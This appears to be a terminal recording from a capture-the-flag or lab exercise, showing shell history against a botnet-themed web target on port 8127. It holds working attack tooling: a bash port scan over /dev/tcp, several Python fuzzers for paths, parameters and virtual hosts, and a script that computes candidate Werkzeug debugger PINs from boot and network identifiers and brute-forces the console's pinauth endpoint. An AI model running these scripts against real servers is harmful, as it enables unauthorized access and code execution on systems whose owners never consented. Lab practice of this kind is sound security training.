[654.811692, "o", "find / -type f \\( -name \"*.py\" -o -name \"*.pyc\" \\) 2>/dev/null | grep -v \"/usr/\" | grep -v \"/root/.cache\" | grep -v \"/opt/\"\r\n\u001b[?2004l\r"]
[654.947781, "o", "/etc/python3.13/sitecustomize.py\r\n/app/fuzzer.py\r\n/app/fuzzer2.py\r\n/app/param_fuzzer.py\r\n/app/fuzzer3.py\r\n/app/vhost_fuzzer.py\r\n/app/path_fuzzer.py\r\n/app/pin_bruter.py\r\n"]
[654.948611, "o", "\u001b[?2004hroot@44c9c5533fe5:/app# "]
[655.775558, "i", "history\n"]
[655.775789, "o", "history\r\n\u001b[?2004l\r"]
[655.775838, "o", "    1  clear\r\n    2  curl -s -v http://target:8127/\r\n    3  ls -la /usr/share/wordlists\r\n    4  ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target:8127/FUZZ\r\n    5  apt-get update && apt-get install -y ffuf dirb\r\n    6  curl -s http://target:8127/robots.txt\r\n    7  curl -s -D - http://target:8127/admin\r\n    8  curl -s -D - http://target:8127/login\r\n    9  curl -s -D - http://target:8127/api\r\n   10  curl -s -D - -H 'Host: urmombotnetdotnet.com' http://target:8127/\r\n   11  ls -la /usr/share/dict/words\r\n"]
[655.776026, "o", "   12  which nc nmap python3 wget bash curl\r\n   13  timeout 5 bash -c 'for p in {1..10000}; do (echo >/dev/tcp/target/$p) 2>/dev/null && echo \"Port $p open\"; done'\r\n   14  ls -la /usr/share/nmap/nselib/data/\r\n   15  nmap -p 8127 --script http-enum target\r\n   16  cat << 'EOF' > fuzzer.py\r\nimport requests\r\nfrom sys import argv\r\n\r\nwith open('/usr/share/nmap/nselib/data/http-folders.txt','r') as f:\r\n  words = f.read().splitlines()\r\n\r\nfor word in words:\r\n  if not word or word.startswith('#'): continue\r\n  if word.startswith('/'): word = word[1:]\r\n  url = f'http://target:8127/{word}'\r\n  try:\r\n    r = requests.get(url)\r\n    if r.status_code != 404:\r\n      print(f'Found: {url} (Status: {r.status_code})')\r\n  except:\r\n    pass\r\nEOF\r\n\r\n   17  python3 fuzzer.py\r\n   18  ls -lah /app\r\n   19  ls -lah /\r\n   20  nmap -p- -T4 target\r\n"]
[655.776084, "o", "   21  for p in flag flag.txt c2 bot console dashboard admin login register test api/v1 api/v2 api/bot command run payload cmd execute; do res=$(curl -s -o /dev/null -w \"%{http_code}\" http://target:8127/$p); if [ \"$res\" != \"404\" ]; then echo \"$p: $res\"; fi; done\r\n   22  curl -s -X OPTIONS -i http://target:8127/\r\n   23  curl -s -X POST -i http://target:8127/\r\n   24  cat << 'EOF' > fuzzer2.py\r\nimport requests\r\nimport concurrent.futures\r\n\r\nwith open('/usr/share/nmap/nselib/data/passwords.lst','r') as f:\r\n  words = f.read().splitlines()\r\n\r\nwords = list(set([w.strip() for w in words if w.strip() and not w.startswith('#')]))\r\n\r\ndef check(word):\r\n  url = f'http://target:8127/{word}'\r\n  try:\r\n    r = requests.get(url, timeout=2)\r\n    if r.status_code != 404:\r\n      print(f'Found: {url} (Status: {r.status_code})')\r\n  except:\r\n    pass\r\n\r\nwith concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:\r\n  executor.map(check, words)\r\nEOF\r\n\r\n   25  python3 fuzzer2.py\r\n   26  curl -s -i http://target:8127/console\r\n   27  curl -s -i -X POST http://target:8127/console\r\n   28  curl -s -i -X POST -H \"Content-Type: application/json\" -d '{}' http://target:8127/console\r\n   29  cat << 'EOF' > param_fuzzer.py\r\nimport requests\r\n\r\nparams = ['cmd', 'command', 'c', 'e', 'exec', 'execute', 'id', 'ip', 'host', 'url', 'test', 'ping', 'query', 'eval', 'code', 'bot', 'botid', 'user', 'username', 'password', 'pass', 'key', 'token', 'action', 'do', 'dir', 'file']\r\n\r\nfor p in params:\r\n    try:\r\n        # Test GET\r\n        r = requests.get(f'http://target:8127/console?{p}=whomai')\r\n        if r.status_code != 400: print(f'GET {p}: {r.status_code} - {r.text[:100]}')\r\n        \r\n        # Test POST Form\r\n        r2 = requests.post('http://target:8127/console', data={p: 'whoami'})\r\n"]
[655.776125, "o", "        if r2.status_code != 400: print(f'POST form {p}: {r2.status_code} - {r2.text[:100]}')\r\n        \r\n        # Test POST JSON\r\n        r3 = requests.post('http://target:8127/console', json={p: 'whoami'})\r\n        if r3.status_code != 400: print(f'POST json {p}: {r3.status_code} - {r3.text[:100]}')\r\n    except:\r\n        pass\r\nEOF\r\n\r\n   30  python3 param_fuzzer.py\r\n   31  find /usr/share/nmap/nselib/ -type f -exec grep -oE '[a-zA-Z_][a-zA-Z0-9_-]{1,15}' {} + | awk -F: '{print $2}' | tr 'A-Z' 'a-z' | sort | uniq -c | sort -nr | head -n 5000 | awk '{print $2}' > /tmp/words.txt\r\n   32  cat << 'EOF' > fuzzer3.py\r\nimport requests\r\nimport concurrent.futures\r\n\r\nwith open('/tmp/words.txt', 'r') as f:\r\n    words = f.read().splitlines()\r\n\r\n"]
[655.776158, "o", "words += [\"bot\", \"cmd\", \"command\", \"c\", \"urmom\", \"target\", \"id\", \"ip\", \"bot_id\", \"botid\", \"execute\", \"payload\", \"agent\", \"cc\", \"c2\", \"file\", \"upload\", \"submit\", \"data\", \"botnet\", \"command_id\", \"machine_id\", \"uuid\", \"mac_address\", \"user\", \"pass\"]\r\nwords = list(set([w for w in words if w]))\r\n\r\ndef check(word):\r\n    url = \"http://target:8127/console\"\r\n    try:\r\n        r = requests.get(f\"{url}?{word}=1\", timeout=3)\r\n        if r.status_code != 400:\r\n            print(f\"GET param found: {word} -> {r.status_code}\")\r\n    except:\r\n        pass\r\n    try:\r\n        r = requests.post(url, data={word: \"1\"}, timeout=3)\r\n        if r.status_code != 400:\r\n            print(f\"POST param found: {word} -> {r.status_code}\")\r\n    except:\r\n        pass\r\n    try:\r\n        r = requests.post(url, files={word: ('test.txt', '1')}, timeout=3)\r\n        if r.status_code != 400:\r\n            print(f\"FILE param found: {word} -> {r.status_code}\")\r\n    except:\r\n        pass\r\n\r\nwith concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:"]
[655.776193, "o", "\r\n    executor.map(check, words)\r\nEOF\r\n\r\n   33  python3 fuzzer3.py\r\n   34  curl -s -i http://target:8127/console -H 'Host: urmombotnetdotnet.com'\r\n   35  curl -s -i -X OPTIONS http://target:8127/console\r\n   36  curl -s -i -H 'Host: urmombotnetdotnet.com' http://target:8127/console\r\n   37  curl -s -i -H 'Host: localhost' http://target:8127/console\r\n   38  curl -s -i http://target:8127/ -H 'Host: localhost'\r\n"]
[655.776229, "o", "   39  curl -s -i http://target:8127/api/ -H 'Host: localhost'\r\n   40  cat << 'EOF' > vhost_fuzzer.py\r\nimport requests\r\nimport concurrent.futures\r\n\r\nwith open('/usr/share/nmap/nselib/data/passwords.lst', 'r') as f:\r\n    words = [w.strip() for w in f if w.strip() and not w.startswith('#')][:2000]\r\n\r\npaths = ['api', 'c2', 'console', 'admin', 'login', 'flag', 'robots.txt', '.git/HEAD', 'bot', 'panel', 'dashboard', 'flag5', 'app', 'index', 'main']\r\nhosts_to_test = ['urmombotnetdotnet.com', 'localhost', '127.0.0.1']\r\n\r\ndef check_host(word):\r\n    # Fuzz subdomains on root path\r\n    host = f\"{word}.urmombotnetdotnet.com\"\r\n    try:\r\n        r = requests.get(\"http://target:8127/\", headers={\"Host\": host}, timeout=1)\r\n        if r.status_code != 404 and r.status_code != 400:\r\n            print(f\"[*] VHost found: {host} -> {r.status_code}\")\r\n    except:\r\n        pass\r\n\r\ndef check_path(args):\r\n"]
[655.776265, "o", "    path, host = args\r\n    try:\r\n        r = requests.get(f\"http://target:8127/{path}\", headers={\"Host\": host}, timeout=1)\r\n        if r.status_code != 404 and r.status_code != 400:\r\n            print(f\"[*] Path found: /{path} (Host: {host}) -> {r.status_code}\")\r\n    except:\r\n        pass\r\n\r\nprint(\"Fuzzing VHosts...\")\r\nwith concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:\r\n    executor.map(check_host, words)\r\n\r\nprint(\"Fuzzing Paths...\")\r\ntasks = [(p, h) for p in paths for h in hosts_to_test]\r\nwith concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:\r\n"]
[655.776297, "o", "    executor.map(check_path, tasks)\r\nEOF\r\n\r\n   41  python3 vhost_fuzzer.py\r\n   42  cat << 'EOF' > path_fuzzer.py\r\nimport requests, concurrent.futures\r\n\r\nwith open('/usr/share/nmap/nselib/data/passwords.lst', 'r') as f:\r\n    words = [w.strip() for w in f if w.strip() and not w.startswith('#')]\r\n\r\ncustom_words = ['api', 'api/v1', 'v1', 'c2', 'bot', 'bots', 'botnet', 'register', 'login', 'admin', 'dashboard', 'flag', 'task', 'tasks', 'command', 'jobs', 'ping', 'status', 'health', 'heartbeat', 'console', 'debug', 'shell', 'exec', 'run', 'urmombotnet', 'urmombotnetdotnet']\r\nwords = list(set(words + custom_words))\r\n\r\ndef check_path(word):\r\n    try:\r\n        r = requests.get(f\"http://target:8127/{word}\", timeout=2)\r\n        if r.status_code != 404:\r\n            print(f\"[*] Path found: /{word} -> {r.status_code}\")\r\n    except:\r\n        pass\r\n\r\nprint(f\"Fuzzing {len(words)} paths...\")\r\nwith concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:\r\n"]
[655.776363, "o", "    executor.map(check_path, words)\r\nEOF\r\n\r\n   43  python3 path_fuzzer.py\r\n   44  cat /etc/machine-id\r\n   45  dig +short TXT target\r\n   46  dig +short ANY urmombotnetdotnet.com\r\n   47  find / -name \"*bot*\" -type f 2>/dev/null | grep -v 'usr/' | grep -v 'var/lib'\r\n   48  cat /proc/sys/kernel/random/boot_id\r\n   49  cat /proc/self/cgroup\r\n"]
[655.776403, "o", "   50  apt-get install -y python3-pip && pip3 install werkzeug==3.1.8 flask --break-system-packages\r\n   51  python3 -c 'import werkzeug.debug; print(werkzeug.debug.__file__)'\r\n   52  curl -s -H 'Host: localhost' 'http://target:8127/console?__debugger__=yes&cmd=resource&f=debugger.js' | head -n 30\r\n   53  cat << 'EOF' > pin_bruter.py\r\nimport hashlib\r\nimport requests\r\nfrom itertools import chain\r\nimport concurrent.futures\r\n\r\nboot_id = open('/proc/sys/kernel/random/boot_id').read().strip()\r\nmac = \"2485377892356\" # hex 02:42:AC:1C:00:04\r\n\r\nusernames = ['root', 'app', 'www-data', 'werkzeug', 'nobody']\r\nmodnames = ['flask.app', 'werkzeug.debug', 'app', '__main__']\r\nappnames = ['Flask', 'DebuggedApplication', 'wsgi_app', 'app']\r\nmodfiles = [\r\n    '/usr/local/lib/python3.11/site-packages/flask/app.py',\r\n    '/usr/local/lib/python3.11/site-packages/werkzeug/debug/__init__.py',\r\n    '/usr/lib/python3.11/site-packages/flask/app.py',\r\n    '/usr/lib/python3.11/site-packages/werkzeug/debug/__init__.py',\r\n    '/app/app.py',\r\n    '/app/main.py',\r\n    getattr(requests, '__file__', '')\r\n]\r\nmachine_ids = [boot_id, \"\"]\r\n\r\npins = set()\r\n\r\nfor u in usernames:\r\n    for m1 in modnames:\r\n        for m2 in appnames:\r\n            for m3 in modfiles:\r\n                for mid in machine_ids:\r\n                    for hash_type in ['sha1', 'md5']:\r\n                        try:\r\n                            h = getattr(hashlib, hash_type)()\r\n                            for bit in chain([u, m1, m2, m3], [mac, mid]):\r\n                                if not bit: continue\r\n"]
[655.776451, "o", "                                if isinstance(bit, str): bit = bit.encode('utf-8')\r\n                                h.update(bit)\r\n                            h.update(b'cookiesalt')\r\n                            h.update(b'pinsalt')\r\n                            num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\r\n                            pin = f\"{num[:3]}-{num[3:6]}-{num[6:9]}\"\r\n                            pins.add(pin)\r\n                        except: pass\r\n\r\nprint(f\"Generated {len(pins)} PINs.\")\r\n\r\ns = requests.Session()\r\nsecret = \"cROx4oCXXz5PA5qlhIU3\"\r\nurl = \"http://target:8127/console\"\r\n\r\ndef try_pin(pin):\r\n    # Werkzeug uses ?__debugger__=yes&cmd=pinauth&pin=...&s=...\r\n    r = s.get(url, params={'__debugger__': 'yes', 'cmd': 'pinauth', 'pin': pin, 's': secret}, headers={'Host': 'localhost'})\r\n    if '\"auth\"' in r.text and 'true' in r.text or r.status_code != 200:\r\n        print(f\"[*] PIN EXPLOITED: {pin}\")\r\n        return pin\r\n    return None\r\n\r\n"]
[655.776493, "o", "with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:\r\n    for res in executor.map(try_pin, list(pins)):\r\n        pass\r\nEOF\r\n\r\n   54  python3 pin_bruter.py\r\n   55  curl -s -H 'Host: localhost' 'http://target:8127/console?__debugger__=yes&cmd=pinauth&pin=123-456-789&s=cROx4oCXXz5PA5qlhIU3'\r\n   56  curl -s -i -H 'Host: localhost' 'http://target:8127/console?__debugger__=yes&cmd=pinauth&pin=1234&s=cROx4oCXXz5PA5qlhIU3'\r\n"]
[655.776527, "o", "   57  env\r\n   58  find / -type f \\( -name \"*.py\" -o -name \"*.pyc\" \\) 2>/dev/null | grep -v \"/usr/\" | grep -v \"/root/.cache\" | grep -v \"/opt/\"\r\n   59  history\r\n"]
